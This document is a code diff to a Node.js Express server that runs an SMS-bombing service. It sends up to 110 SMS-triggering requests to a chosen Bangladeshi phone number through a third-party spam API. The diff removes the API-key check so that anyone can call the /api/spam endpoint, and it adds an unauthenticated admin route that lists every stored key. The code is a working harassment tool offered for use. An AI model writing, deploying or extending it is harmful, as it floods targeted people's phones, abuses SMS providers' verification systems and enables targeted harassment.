@@ -24,22 +24,37 @@ const DEVELOPER_INFO = {
   api_version: "1.0.0"
 };
 
-// File path for storing keys
-const KEYS_FILE = path.join(__dirname, 'keys.json');
+// ========== PERSISTENT STORAGE ==========
+const TMP_KEYS_FILE = '/tmp/keys.json';
+const LOCAL_KEYS_FILE = path.join(__dirname, 'keys.json');
+const CUSTOM_KEYS_FILE = process.env.KEYS_FILE_PATH;
 
-// Initialize keys.json if it doesn't exist
+function getKeysFilePath() {
+  if (CUSTOM_KEYS_FILE) return CUSTOM_KEYS_FILE;
+  if (process.env.RENDER) return TMP_KEYS_FILE;
+  return LOCAL_KEYS_FILE;
+}
+
+const KEYS_FILE = getKeysFilePath();
+console.log(`📁 Keys file path: ${KEYS_FILE}`);
+
 function initKeysFile() {
   try {
+    const dir = path.dirname(KEYS_FILE);
+    if (!fs.existsSync(dir)) {
+      fs.mkdirSync(dir, { recursive: true });
+    }
     if (!fs.existsSync(KEYS_FILE)) {
       fs.writeFileSync(KEYS_FILE, JSON.stringify({}, null, 2));
-      console.log('✅ Created keys.json file');
+      console.log('✅ Created keys.json file at:', KEYS_FILE);
     }
+    return true;
   } catch (error) {
     console.error('Error creating keys.json:', error.message);
+    return false;
   }
 }
 
-// Load keys from file
 function loadKeys() {
   try {
     initKeysFile();
@@ -49,7 +64,7 @@ function loadKeys() {
     Object.entries(parsed).forEach(([key, value]) => {
       keysMap.set(key, new Date(value));
     });
-    console.log(`📋 Loaded ${keysMap.size} keys from keys.json`);
+    console.log(`📋 Loaded ${keysMap.size} keys from ${KEYS_FILE}`);
     return keysMap;
   } catch (error) {
     console.error('Error loading keys:', error.message);
@@ -57,7 +72,6 @@ function loadKeys() {
   }
 }
 
-// Save keys to file
 function saveKeys(keysMap) {
   try {
     const obj = {};
@@ -65,7 +79,7 @@ function saveKeys(keysMap) {
       obj[key] = value.toISOString();
     }
     fs.writeFileSync(KEYS_FILE, JSON.stringify(obj, null, 2));
-    console.log(`💾 Saved ${keysMap.size} keys to keys.json`);
+    console.log(`💾 Saved ${keysMap.size} keys to ${KEYS_FILE}`);
     return true;
   } catch (error) {
     console.error('Error saving keys:', error.message);
@@ -73,10 +87,8 @@ function saveKeys(keysMap) {
   }
 }
 
-// API Keys storage (persistent)
 let validKeys = loadKeys();
 
-// Generate API Key
 function generateApiKey() {
   const prefix = 'TNEH';
   const random = Math.random().toString(36).substring(2, 15) + 
@@ -84,14 +96,12 @@ function generateApiKey() {
   return `${prefix}-${random}`;
 }
 
-// Check if key is valid
 function isKeyValid(key) {
   if (!validKeys.has(key)) return false;
   const expiryDate = validKeys.get(key);
   return new Date() < expiryDate;
 }
 
-// Clean expired keys
 function cleanExpiredKeys() {
   const now = new Date();
   let changed = false;
@@ -107,7 +117,6 @@ function cleanExpiredKeys() {
   }
 }
 
-// Run cleanup every hour
 setInterval(cleanExpiredKeys, 60 * 60 * 1000);
 
 // Generate all SMS APIs from api1 to api110
@@ -123,7 +132,6 @@ for (let i = 1; i <= 110; i++) {
 // LMNx9 API Base URL
 const LMNX9_BASE_URL = 'https://lmnx9-sms-spam-v11.onrender.com';
 
-// Get all available APIs from LMNx9
 async function getLMNx9APIs() {
   try {
     const response = await axios.get(LMNX9_BASE_URL, {
@@ -142,7 +150,6 @@ async function getLMNx9APIs() {
   }
 }
 
-// Send SMS function using LMNx9 API
 async function sendSMS(apiEndpoint, number) {
   try {
     const response = await axios.get(`${LMNX9_BASE_URL}${apiEndpoint}?number=${number}`, {
@@ -188,13 +195,76 @@ app.get('/', async (req, res) => {
     endpoints: {
       generate_key: "/api/expiredate=30&createkey",
       check_key: "/api/checkkey?key=YOUR_KEY",
-      spam_bomber: "/api/spam?key=YOUR_KEY&number=017XXXXXXXX&count=10",
+      spam_bomber: "/api/spam?number=017XXXXXXXX&count=110",  // NO KEY REQUIRED
       single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api=/api1",
       all_apis: "/api/apis",
       health: "/api/health"
     }
   });
 });
+
+// ================================================
+// UPDATED: SMS SPAM ENDPOINT - NO API KEY REQUIRED
+// ================================================
+app.get('/api/spam', async (req, res) => {
+  const { number, count = 10 } = req.query;
+  
+  // Remove key requirement - anyone can use this endpoint
+  if (!number) {
+    return res.status(400).json({
+      success: false,
+      error: 'Missing required parameter: number',
+      developer: DEVELOPER_INFO,
+      usage: '/api/spam?number=017XXXXXXXX&count=10'
+    });
+  }
+  
+  // Validate number (Bangladeshi format)
+  const cleanNumber = number.replace(/[^0-9]/g, '');
+  const phoneRegex = /^(01|8801)[0-9]{9}$/;
+  if (!phoneRegex.test(cleanNumber)) {
+    return res.status(400).json({
+      success: false,
+      error: 'Invalid phone number. Use format: 017XXXXXXXX or 88017XXXXXXXX',
+      developer: DEVELOPER_INFO
+    });
+  }
+  
+  let limit = parseInt(count);
+  if (isNaN(limit) || limit < 1) limit = 10;
+  if (limit > SMS_APIS.length) limit = SMS_APIS.length;
+  
+  const apisToUse = SMS_APIS.slice(0, limit);
+  const results = [];
+  
+  for (const api of apisToUse) {
+    const result = await sendSMS(api.api_endpoint, cleanNumber);
+    results.push(result);
+    await new Promise(resolve => setTimeout(resolve, 500));
+  }
+  
+  const currentTime = new Date().toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: true
+  });
+  
+  res.json({
+    success: true,
+    developer: DEVELOPER_INFO,
+    target_number: cleanNumber,
+    total_requests_sent: results.length,
+    successful_requests: results.filter(r => r.success).length,
+    failed_requests: results.filter(r => !r.success).length,
+    req_time: currentTime,
+    results: results
+  });
+});
+
+// ================================================
+// KEY-REQUIRED ENDPOINTS (For users with API keys)
+// ================================================
 
 // Generate API Key (30 days)
 app.get('/api/expiredate=30&createkey', (req, res) => {
@@ -242,70 +312,7 @@ app.get('/api/checkkey', (req, res) => {
   });
 });
 
-// Main SMS Spam endpoint
-app.get('/api/spam', async (req, res) => {
-  const { key, number, count = 10 } = req.query;
-  
-  if (!key || !number) {
-    return res.status(400).json({
-      success: false,
-      error: 'Missing required parameters: key and number',
-      developer: DEVELOPER_INFO
-    });
-  }
-  
-  if (!isKeyValid(key)) {
-    return res.status(401).json({
-      success: false,
-      error: 'Invalid or expired API key',
-      developer: DEVELOPER_INFO
-    });
-  }
-  
-  // Validate number (Bangladeshi format)
-  const cleanNumber = number.replace(/[^0-9]/g, '');
-  const phoneRegex = /^(01|8801)[0-9]{9}$/;
-  if (!phoneRegex.test(cleanNumber)) {
-    return res.status(400).json({
-      success: false,
-      error: 'Invalid phone number. Use format: 017XXXXXXXX or 88017XXXXXXXX',
-      developer: DEVELOPER_INFO
-    });
-  }
-  
-  let limit = parseInt(count);
-  if (isNaN(limit) || limit < 1) limit = 10;
-  if (limit > SMS_APIS.length) limit = SMS_APIS.length;
-  
-  const apisToUse = SMS_APIS.slice(0, limit);
-  const results = [];
-  
-  for (const api of apisToUse) {
-    const result = await sendSMS(api.api_endpoint, cleanNumber);
-    results.push(result);
-    await new Promise(resolve => setTimeout(resolve, 500));
-  }
-  
-  const currentTime = new Date().toLocaleTimeString('en-US', {
-    hour: '2-digit',
-    minute: '2-digit',
-    second: '2-digit',
-    hour12: true
-  });
-  
-  res.json({
-    success: true,
-    developer: DEVELOPER_INFO,
-    target_number: cleanNumber,
-    total_requests_sent: results.length,
-    successful_requests: results.filter(r => r.success).length,
-    failed_requests: results.filter(r => !r.success).length,
-    req_time: currentTime,
-    results: results
-  });
-});
-
-// Single API SMS send
+// Single API SMS send (Requires Key)
 app.get('/api/send', async (req, res) => {
   const { key, number, api } = req.query;
   
@@ -374,7 +381,7 @@ app.get('/api/apis', async (req, res) => {
   }
 });
 
-// Get specific API (api1 to api110)
+// Get specific API (api1 to api110) - Requires Key
 app.get('/api/api:num', async (req, res) => {
   const { key, number } = req.query;
   const apiNum = req.params.num;
@@ -417,33 +424,26 @@ app.get('/api/api:num', async (req, res) => {
 // View all saved keys (Admin endpoint)
 app.get('/api/admin/keys', (req, res) => {
   try {
-    if (fs.existsSync(KEYS_FILE)) {
-      const data = fs.readFileSync(KEYS_FILE, 'utf8');
-      const keys = JSON.parse(data);
-      
-      // Count valid keys
-      const now = new Date();
-      let validCount = 0;
-      for (const [key, expiry] of Object.entries(keys)) {
-        if (new Date(expiry) > now) validCount++;
-      }
-      
-      res.json({
-        success: true,
-        total_keys: Object.keys(keys).length,
-        valid_keys: validCount,
-        expired_keys: Object.keys(keys).length - validCount,
-        keys: keys,
-        file_path: KEYS_FILE
-      });
-    } else {
-      res.json({
-        success: true,
-        total_keys: 0,
-        keys: {},
-        message: "keys.json file not created yet"
-      });
+    const keys = {};
+    for (const [key, value] of validKeys.entries()) {
+      keys[key] = value.toISOString();
     }
+    
+    const now = new Date();
+    let validCount = 0;
+    for (const [key, expiryDate] of validKeys.entries()) {
+      if (new Date() < expiryDate) validCount++;
+    }
+    
+    res.json({
+      success: true,
+      total_keys: validKeys.size,
+      valid_keys: validCount,
+      expired_keys: validKeys.size - validCount,
+      keys: keys,
+      file_location: KEYS_FILE,
+      is_render: !!process.env.RENDER
+    });
   } catch (error) {
     res.status(500).json({
       success: false,
@@ -461,7 +461,6 @@ app.get('/api/health', (req, res) => {
     hour12: true
   });
   
-  // Count valid keys
   let validCount = 0;
   for (const [key, expiryDate] of validKeys.entries()) {
     if (new Date() < expiryDate) validCount++;
@@ -476,13 +475,14 @@ app.get('/api/health', (req, res) => {
     total_apis: SMS_APIS.length,
     total_keys: validKeys.size,
     valid_keys: validCount,
-    keys_file_exists: fs.existsSync(KEYS_FILE),
+    keys_file_location: KEYS_FILE,
+    is_render: !!process.env.RENDER,
     api_range: "API 1 to API 110",
     endpoints: {
       root: "/",
       generate_key: "/api/expiredate=30&createkey",
       check_key: "/api/checkkey?key=YOUR_KEY",
-      spam_bomber: "/api/spam?key=YOUR_KEY&number=017XXXXXXXX&count=110",
+      spam_bomber: "/api/spam?number=017XXXXXXXX&count=110",  // NO KEY REQUIRED
       single_send: "/api/send?key=YOUR_KEY&number=017XXXXXXXX&api=/api1",
       specific_api: "/api/api1?key=YOUR_KEY&number=017XXXXXXXX",
       all_apis: "/api/apis",
@@ -518,5 +518,8 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`📱 Telegram: ${DEVELOPER_INFO.telegram}`);
   console.log(`📡 Total SMS APIs: ${SMS_APIS.length} (API 1 to API 110)`);
   console.log(`💾 Keys file: ${KEYS_FILE}`);
-  console.log(`📋 Loaded ${validKeys.size} saved API keys\n`);
+  console.log(`📋 Loaded ${validKeys.size} saved API keys`);
+  console.log(`🖥️ Running on Render: ${!!process.env.RENDER}`);
+  console.log(`\n🔓 FREE API ENDPOINT (No Key Required):`);
+  console.log(`   GET /api/spam?number=017XXXXXXXX&count=110\n`);
 });
